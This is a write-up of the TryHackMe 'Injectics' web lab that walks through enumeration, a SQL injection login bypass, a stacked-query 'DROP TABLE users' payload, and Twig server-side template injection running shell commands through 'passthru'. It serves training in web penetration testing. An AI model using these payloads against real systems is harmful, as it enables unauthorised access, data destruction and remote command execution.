@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="keywords" content="Injectics, Injectics Writeup, Write-Up, TryHackMe, thm, Aleksander Jóźwik" />
+  <title>Injectics</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        background-color: #232629;
+        color: #7a7c7d;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+    div.sourceCode
+      { color: #cfcfc2; background-color: #232629; }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span { color: #cfcfc2; } /* Normal */
+    code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+    code span.an { color: #3f8058; } /* Annotation */
+    code span.at { color: #2980b9; } /* Attribute */
+    code span.bn { color: #f67400; } /* BaseN */
+    code span.bu { color: #7f8c8d; } /* BuiltIn */
+    code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #3daee9; } /* Char */
+    code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+    code span.co { color: #7a7c7d; } /* Comment */
+    code span.cv { color: #7f8c8d; } /* CommentVar */
+    code span.do { color: #a43340; } /* Documentation */
+    code span.dt { color: #2980b9; } /* DataType */
+    code span.dv { color: #f67400; } /* DecVal */
+    code span.er { color: #da4453; text-decoration: underline; } /* Error */
+    code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+    code span.fl { color: #f67400; } /* Float */
+    code span.fu { color: #8e44ad; } /* Function */
+    code span.im { color: #27ae60; } /* Import */
+    code span.in { color: #c45b00; } /* Information */
+    code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+    code span.op { color: #cfcfc2; } /* Operator */
+    code span.ot { color: #27ae60; } /* Other */
+    code span.pp { color: #27ae60; } /* Preprocessor */
+    code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+    code span.sc { color: #3daee9; } /* SpecialChar */
+    code span.ss { color: #da4453; } /* SpecialString */
+    code span.st { color: #f44f4f; } /* String */
+    code span.va { color: #27aeae; } /* Variable */
+    code span.vs { color: #da4453; } /* VerbatimString */
+    code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="../../../css/style.css" />
+  <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+  <script src="../../../scripts/menu.js"></script>
+  <script src="../../../scripts/terminal.js"></script>
+  <script src="../../../scripts/images.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <link rel="icon" type="image/svg+xml" href="../../../img/favicon/favicon.svg">
+</head>
+<body>
+<div class="logo">
+<img src="../../../img/favicon/favicon-64.png" style="width:64px; display:block;">
+</div>
+
+<!-- Navbar -->
+<nav class="top-navigation">
+  <ul>
+    <li>
+      <a href="https://aleksanderjozwik.com"><i class="fas fa-home"></i> Home</a>
+    </li>
+
+    <li>
+      <a href="https://www.github.com/jozwikaleksander"><i class="fa-brands fa-github"></i> Github</a>
+    </li>
+
+    <li>
+      <a href="../../../index.html"><i class="fas fa-book"></i> Write-Ups</a>
+    </li>
+  </ul>
+</nav>
+<header id="title-block-header">
+<h1 class="title">Injectics</h1>
+<p class="date"><i class="fa-solid fa-calendar"></i> Creation date:<span style='opacity:0;'>_</span>13.08.2024</p>
+</header>
+<nav id="TOC" role="doc-toc">
+<ul>
+<li><a href="#enumeration"><span class="toc-section-number">1</span> Enumeration</a>
+<ul>
+<li><a href="#nmap-scan"><span class="toc-section-number">1.1</span> Nmap scan</a></li>
+<li><a href="#gobuster-scan"><span class="toc-section-number">1.2</span> Gobuster scan</a></li>
+<li><a href="#composer.json"><span class="toc-section-number">1.3</span> composer.json</a></li>
+<li><a href="#index.php"><span class="toc-section-number">1.4</span> index.php</a></li>
+<li><a href="#mail.log"><span class="toc-section-number">1.5</span> mail.log</a></li>
+<li><a href="#login.php"><span class="toc-section-number">1.6</span> login.php</a></li>
+<li><a href="#script.js"><span class="toc-section-number">1.7</span> script.js</a></li>
+</ul></li>
+<li><a href="#injecting-sql-to-login-form"><span class="toc-section-number">2</span> Injecting SQL to login form</a></li>
+<li><a href="#dev-panel"><span class="toc-section-number">3</span> Dev panel</a>
+<ul>
+<li><a href="#injecting-sql-in-leaderboard-edit-page"><span class="toc-section-number">3.1</span> Injecting SQL in leaderboard edit page</a></li>
+</ul></li>
+<li><a href="#admin-panel"><span class="toc-section-number">4</span> Admin panel</a>
+<ul>
+<li><a href="#editing-profile"><span class="toc-section-number">4.1</span> Editing profile</a></li>
+<li><a href="#server-side-template-injection"><span class="toc-section-number">4.2</span> Server-Side Template Injection</a></li>
+</ul></li>
+</ul>
+</nav>
+<main>
+<div class="card summary">
+<h4>
+Summary
+</h4>
+<hr>
+<b><i class="fa-solid fa-box"></i> Source:</b> <a href='https://tryhackme.com/r/room/injectics'>TryHackMe <i class="fa-solid fa-arrow-up-right-from-square"></i></a><br> <b><i class="fa-solid fa-signal"></i> Difficulty:</b> <span class="medium-diff">Medium</span><br> </span>
+</div>
+<div class="card">
+<h4>
+Description
+</h4>
+<hr>
+Can you utilise your web pen-testing skills to safeguard the event from any injection attack?
+</div>
+<p>This room is the last from <a href="https://tryhackme.com/module/injection-attacks">Injection Attacks module</a>, so be sure to finish the rest of the module before tackling this box.</p>
+<h1 data-number="1" id="enumeration"><span class="header-section-number">1</span> Enumeration</h1>
+<h2 data-number="1.1" id="nmap-scan"><span class="header-section-number">1.1</span> Nmap scan</h2>
+<p>Let’s start enumeration by running an <strong>nmap scan</strong> (<strong>-sV</strong> - service version detection; <strong>-sC</strong> - enables most common scripts; <strong>-p-</strong> - scan all ports).</p>
+<pre><code>$ nmap -sV -sC -p- 10.10.152.215
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 22:15 CEST
+Nmap scan report for 10.10.152.215
+Host is up (0.053s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d3:13:d6:56:06:db:b0:41:55:db:d5:3d:36:60:19:e9 (RSA)
+|   256 92:93:9e:aa:fc:ec:18:82:1e:4c:d1:07:2c:b9:0a:80 (ECDSA)
+|_  256 19:7b:40:56:44:d4:10:86:35:aa:16:7d:1e:1d:8f:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Injectics Leaderboard
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+<p>As we can see there are <strong>2 open ports</strong>: <strong>SSH</strong> and <strong>HTTP</strong>. Let’s enumerate the HTTP server using <strong>Gobuster</strong>.</p>
+<h2 data-number="1.2" id="gobuster-scan"><span class="header-section-number">1.2</span> Gobuster scan</h2>
+<p>I will use following parameters:</p>
+<ul>
+<li><strong>-x</strong> - scanning for specific file extensions</li>
+<li><strong>-u</strong> - URL</li>
+<li><strong>-w</strong> - wordlist</li>
+<li><strong>-t</strong> - number of concurrent threads (faster scanning)</li>
+<li><strong>-b</strong> - blacklisting HTTP status codes (404,403)</li>
+</ul>
+<pre><code>gobuster dir -x txt,php,html,js,json -u http://10.10.28.40 -w /usr/share/wordlists/dirb/big.txt -t 32 -b 404,403 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.28.40
+[+] Method:                  GET
+[+] Threads:                 32
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,js,json,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/composer.json        (Status: 200) [Size: 48]
+/conn.php             (Status: 200) [Size: 0]
+/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.28.40/css/]
+/dashboard.php        (Status: 302) [Size: 0] [--&gt; dashboard.php]
+/flags                (Status: 301) [Size: 310] [--&gt; http://10.10.28.40/flags/]
+/functions.php        (Status: 200) [Size: 0]
+/index.php            (Status: 200) [Size: 6588]
+/javascript           (Status: 301) [Size: 315] [--&gt; http://10.10.28.40/javascript/]
+/js                   (Status: 301) [Size: 307] [--&gt; http://10.10.28.40/js/]
+/login.php            (Status: 200) [Size: 5401]
+/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]
+/phpmyadmin           (Status: 301) [Size: 315] [--&gt; http://10.10.28.40/phpmyadmin/]
+/script.js            (Status: 200) [Size: 1088]
+/vendor               (Status: 301) [Size: 311] [--&gt; http://10.10.28.40/vendor/]
+Progress: 122814 / 122820 (100.00%)
+===============================================================
+Finished
+===============================================================</code></pre>
+<p>To summarize the scan, we’ve got <strong>composer.json</strong> which is a file of <a href="https://getcomposer.org/">Composer</a> - dependency manager for PHP, some PHP files, <strong>flags and vendor</strong> directories, <strong>phpmyadmin/</strong> directory - <a href="https://www.phpmyadmin.net/">tool</a> that facilitates database management, <a href="">script.js</a> and other typical directories.</p>
+<h2 data-number="1.3" id="composer.json"><span class="header-section-number">1.3</span> composer.json</h2>
+<figure>
+<img src="images/composer.png" alt="" /><figcaption>composer.json</figcaption>
+</figure>
+<p>Project uses <a href="https://twig.symfony.com/">twig</a> which is a PHP template engine used in <a href="https://en.wikipedia.org/wiki/Symfony">Symfony framework</a>.</p>
+<h2 data-number="1.4" id="index.php"><span class="header-section-number">1.4</span> index.php</h2>
+<p><img src="images/index.png" alt="index.php" /> There is nothing interesting here, so let’s check the source code.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="co">&lt;!-- Website developed by John Tim - dev@injectics.thm--&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="co">&lt;!-- Mails are stored in mail.log file--&gt;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a>    <span class="co">&lt;!-- Bootstrap JS and dependencies --&gt;</span></span></code></pre></div>
+<p>There is a comment at the end of the file. It says mails are stored in <a href="#maillog">mail.log</a> file.</p>
+<h2 data-number="1.5" id="mail.log"><span class="header-section-number">1.5</span> mail.log</h2>
+<pre><code>From: dev@injectics.thm
+To: superadmin@injectics.thm
+Subject: Update before holidays
+
+Hey,
+
+Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.
+
+To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
+
+Here are the default credentials that will be added:
+
+| Email                     | Password                |
+|---------------------------|-------------------------|
+| superadmin@injectics.thm  | superSecurePasswd101    |
+| dev@injectics.thm         | devPasswd123            |
+
+Please let me know if there are any further updates or changes needed.
+
+Best regards,
+Dev Team
+
+dev@injectics.thm</code></pre>
+<p>In summary, if we delete the <strong>users table</strong>, default credentials will be automatically inserted.</p>
+<h2 data-number="1.6" id="login.php"><span class="header-section-number">1.6</span> login.php</h2>
+<p>From the index page we can navigate to <strong>login.php</strong>. <img src="images/Login%20form.png" alt="Login form" /> The button on the bottom redirects as to new file called <strong>adminLogin007.php</strong>. Unfortunately we can’t login with default credentials. <img src="images/Login%20page%20source.png" alt="Source code of login page" /> If we check source of the <strong>login.php</strong>, we will find that <strong>script.js</strong> (file we found during <a href="#gobuster-scan">gobuster scan</a>) is used here, so let’s examine it.</p>
+<h2 data-number="1.7" id="script.js"><span class="header-section-number">1.7</span> script.js</h2>
+<div class="sourceCode" id="cb5"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="fu">$</span>(<span class="st">&quot;#login-form&quot;</span>)<span class="op">.</span><span class="fu">on</span>(<span class="st">&quot;submit&quot;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>    e<span class="op">.</span><span class="fu">preventDefault</span>()<span class="op">;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>    <span class="kw">var</span> username <span class="op">=</span> <span class="fu">$</span>(<span class="st">&quot;#email&quot;</span>)<span class="op">.</span><span class="fu">val</span>()<span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>    <span class="kw">var</span> password <span class="op">=</span> <span class="fu">$</span>(<span class="st">&quot;#pwd&quot;</span>)<span class="op">.</span><span class="fu">val</span>()<span class="op">;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a>    <span class="kw">const</span> invalidKeywords <span class="op">=</span> [<span class="st">&#39;or&#39;</span><span class="op">,</span> <span class="st">&#39;and&#39;</span><span class="op">,</span> <span class="st">&#39;union&#39;</span><span class="op">,</span> <span class="st">&#39;select&#39;</span><span class="op">,</span> <span class="st">&#39;&quot;&#39;</span><span class="op">,</span> <span class="st">&quot;&#39;&quot;</span>]<span class="op">;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a>            <span class="cf">for</span> (<span class="kw">let</span> keyword <span class="kw">of</span> invalidKeywords) {</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>                <span class="cf">if</span> (username<span class="op">.</span><span class="fu">includes</span>(keyword)) {</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a>                    <span class="fu">alert</span>(<span class="st">&#39;Invalid keywords detected&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a>                   <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>                }</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a>            }</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a>    $<span class="op">.</span><span class="fu">ajax</span>({</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a>        <span class="dt">url</span><span class="op">:</span> <span class="st">&#39;functions.php&#39;</span><span class="op">,</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a>        <span class="dt">type</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a>        <span class="dt">data</span><span class="op">:</span> {</span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a>            <span class="dt">username</span><span class="op">:</span> username<span class="op">,</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a>            <span class="dt">password</span><span class="op">:</span> password<span class="op">,</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a>            <span class="kw">function</span><span class="op">:</span> <span class="st">&quot;login&quot;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a>        }<span class="op">,</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true"></a>        <span class="dt">dataType</span><span class="op">:</span> <span class="st">&#39;json&#39;</span><span class="op">,</span></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true"></a>        <span class="dt">success</span><span class="op">:</span> <span class="kw">function</span>(data) {</span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true"></a>            <span class="cf">if</span> (data<span class="op">.</span><span class="at">status</span> <span class="op">==</span> <span class="st">&quot;success&quot;</span>) {</span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true"></a>                <span class="cf">if</span> (data<span class="op">.</span><span class="at">auth_type</span> <span class="op">==</span> <span class="dv">0</span>){</span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true"></a>                    <span class="bu">window</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;dashboard.php&#39;</span><span class="op">;</span></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true"></a>                }<span class="cf">else</span>{</span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true"></a>                    <span class="bu">window</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;dashboard.php&#39;</span><span class="op">;</span></span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true"></a>                }</span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true"></a>            } <span class="cf">else</span> {</span>
+<span id="cb5-31"><a href="#cb5-31" aria-hidden="true"></a>                <span class="fu">$</span>(<span class="st">&quot;#messagess&quot;</span>)<span class="op">.</span><span class="fu">html</span>(<span class="st">&#39;&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;&#39;</span> <span class="op">+</span> data<span class="op">.</span><span class="at">message</span> <span class="op">+</span> <span class="st">&#39;&lt;/div&gt;&#39;</span>)<span class="op">;</span></span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true"></a>            }</span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true"></a>        }</span>
+<span id="cb5-34"><a href="#cb5-34" aria-hidden="true"></a>    })<span class="op">;</span></span>
+<span id="cb5-35"><a href="#cb5-35" aria-hidden="true"></a>})<span class="op">;</span></span></code></pre></div>
+<p>We can see that <a href="https://jquery.com/">jQuery</a> (javascript library) is used here. Script overwrites the default behaviour of form element (<strong>preventDefault</strong> function, it means that the page won’t be refreshed), next it grabs values of username and password inputs. It checks for signs of <strong>SQL injection</strong> in the username. Next it sends a POST request to <strong>functions.php</strong> with credentials provided by the user. If they match with a record in the database user is directed to <strong>dashboard.php</strong> file.</p>
+<h1 data-number="2" id="injecting-sql-to-login-form"><span class="header-section-number">2</span> Injecting SQL to login form</h1>
+<p>We can try injecting SQL in the form to authenticate to the dashboard. For this I will use <a href="https://www.zaproxy.org/">ZAP</a> - web app scanner. I will fuzz the username in order to find proper payload. <img src="images/ZAP1.png" alt="Opening Firefox in ZAP" /> First click on the <strong>Firefox icon</strong>, in the browser navigate to <strong>login.php</strong> and submit some data in the form. <img src="images/ZAP2.png" alt="Sending a request from ZAP’s firefox" /> Now we can close the browser and come back to <strong>ZAP</strong>. <img src="images/ZAP3.png" alt="Choosing an attack" /> As we can see there is more stuff now. Let’s right click on the <strong>functions.php</strong>, go to <strong>Attack</strong> and <strong>Fuzz</strong>. <img src="images/ZAP4.png" alt="Adding new fuzz location" /> In a new window <strong>select the username value</strong> and click on <strong>Add…</strong>; <img src="images/ZAP5.png" alt="Payloads window" /> Click <strong>Add</strong>… <img src="images/ZAP6.png" alt="Add payload" /> In <strong>Type</strong> choose <em>File</em>, and in <strong>File</strong> choose wordlist. To grab a wordlist we can search on Google for <em>“Authentication bypass SQL injection wordlist”</em> and choose the first one. <img src="images/ZAP7.png" alt="Finding a wordlist" /> For you convenience I will link it <a href="https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt">here</a>. <img src="images/ZAP8.png" alt="Fuzzer window" /> If you’ve done everything properly you should see new record in Fuzz Locations and the username value should be highlighted. Now you can click <strong>Start Fuzzer</strong>. <img src="images/ZAP9.png" alt="Results of the scan" /> After the scan is done, click on the <strong>Response tab</strong> and in the <strong>Fuzzer tab</strong> scroll through records (using arrow keys) to find one which generates successful response. If you look in the <strong>Request tab</strong> you will see that this is the value we were looking for:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="st">&#39; OR &#39;</span>x<span class="st">&#39;=&#39;</span>x<span class="st">&#39;#;</span></span></code></pre></div>
+<p>Although this payload successfully bypasses authentication, if you were to submit a request with this value in the browser, this message would appear. <img src="images/Invalid%20Keyword.png" alt="Invalid keyword alert" /> This is a result of <a href="#script.js">script.js</a> file, which we examined earlier. To bypass it we would need to intercept login request after it was sent from browser and edit username value. It can be done using <a href="https://portswigger.net/burp">Burp</a>, but this time I will just copy <a href="https://www.w3docs.com/snippets/php/what-is-phpsessid.html">PHPSESSID</a> Cookie from <strong>ZAP</strong> and paste it in my browser. <img src="images/Cookie%20in%20ZAP.png" alt="Copying cookie from ZAP" /> You will find the cookie in the <strong>request</strong> tab. <img src="images/Pasting%20cookie.png" alt="Pasting cookie in the browser" /> In Firefox open <strong>Web Developer Tools</strong> (Ctrl+Shift+I), go to <strong>Storage</strong> and paste the value. Now refresh the page (Ctrl+R) or navigate to <strong>/dashboard.php</strong> and you should be in.</p>
+<h1 data-number="3" id="dev-panel"><span class="header-section-number">3</span> Dev panel</h1>
+<p><img src="images/Dashboard.png" alt="Dashboard" /> There is a leaderboard, which we can edit. If we press any of the Edit buttons we will be redirected to <strong>/edit_leaderboard.php</strong> file, with corresponding <strong>rank</strong> and <strong>country</strong> GET parameters.</p>
+<h2 data-number="3.1" id="injecting-sql-in-leaderboard-edit-page"><span class="header-section-number">3.1</span> Injecting SQL in leaderboard edit page</h2>
+<p><img src="images/edit_leaderboard.png" alt="Edit leaderboard page" /> Form above sends a <strong>POST request</strong> to the same file (edit_leaderboard.php) with parameters listed below:</p>
+<ul>
+<li>rank</li>
+<li>country</li>
+<li>gold</li>
+<li>silver</li>
+<li>bronze</li>
+</ul>
+<p>We will again try SQLi, in this scenario we will stack queries using <strong>semi-colon</strong>. We will pass the payload in Gold variable and it will look like this:</p>
+<pre><code>;DROP TABLE users -- -</code></pre>
+<p>The <strong>semi-colon</strong> ends previous query, next we use <em>DROP TABLE users</em> to delete the table, lastly we add a comment <em>“--”</em> on top of that we add <strong>space</strong> and an <strong>additional hyphen</strong> to ensure that comment works properly. More about that last part you will find <a href="https://security.stackexchange.com/questions/229015/in-sql-injections-why-do-they-put-at-the-end-of-the-url">here</a>.</p>
+<p>After sending this request we will see a message. <img src="images/drop%20message.png" alt="Message after droping users database" /> After we wait, logout and try to login on <strong>/adminLogin007.php</strong> using default credentials we retrieved from <a href="#%20mail.log">mail.log</a>. I will show those creds again below:</p>
+<pre><code>| Email                     | Password                |
+|---------------------------|-------------------------|
+| superadmin@injectics.thm  | superSecurePasswd101    |
+| dev@injectics.thm         | devPasswd123            |</code></pre>
+<h1 data-number="4" id="admin-panel"><span class="header-section-number">4</span> Admin panel</h1>
+<p>On logon we were again redirected to <strong>dashboard.php</strong>, this time it looks different and we can see a first flag in center. <img src="images/admin%20panel.png" alt="Admin panel" /> Also there are 3 buttons in the top right. <img src="images/Admin%20panel%20buttons.png" alt="Buttons in admin panel" /> Let’s go to <strong>Profile</strong>.</p>
+<h2 data-number="4.1" id="editing-profile"><span class="header-section-number">4.1</span> Editing profile</h2>
+<p><img src="images/Editing%20profile.png" alt="Update profile page" /> Here we can edit profile details. If you recall on the dashboard there was a message “Welcome, admin!”, so probably the <em>“first name”</em> value is used to display the message. We can try to set it to a random value like test, and see if something changes in the dashboard. <img src="images/Testing%20name%20change.png" alt="Testing name change" /> And here it is!</p>
+<h2 data-number="4.2" id="server-side-template-injection"><span class="header-section-number">4.2</span> Server-Side Template Injection</h2>
+<p>In the <strong>composer.json</strong> file, we discovered that this app uses <a href="https://twig.symfony.com/">twig</a> (a template engine), so we can try <strong>Server-Side Template Injection</strong>. We will inject malicious code into a template, which will be executed on the server. More about SSTI <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">here</a>. Let’s go back to Profile page, and test our idea using payload below:</p>
+<pre><code>{{7*7}}</code></pre>
+<p><img src="images/SSTI%20test.png" alt="SSTI test" /> As we can see our payload was processed. Now let’s try something more exciting. If you check the THM page our goal is to read content of <strong>flags</strong> directory. In order to find payload which works you can use this <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig">PayloadsAllTheThings</a> repository.</p>
+<p>If we combine some payloads listed in the repo, we’ve got this:</p>
+<pre><code>{{[&#39;id&#39;,&#39;&#39;]|sort(&#39;passthru&#39;)}}</code></pre>
+<p>Passing it into the form will result in this welcome message. <img src="images/SSTI1.png" alt="Testing payload" /> Now that we have PoC, we can search for flags directory.</p>
+<pre><code>{{[&#39;ls&#39;,&#39;&#39;]|sort(&#39;passthru&#39;)}}</code></pre>
+<p><img src="images/SSTI2.png" alt="Listing content of the root folder" /> As we can see there is our flags directory, so let’s read everything inside this directory.</p>
+<pre><code>{{[&#39;cat flags/*&#39;,&#39;&#39;]|sort(&#39;passthru&#39;)}}</code></pre>
+<p><img src="images/Final%20flag.png" alt="Final flag" /> And there is our last flag.</p>
+</body>
+</html>
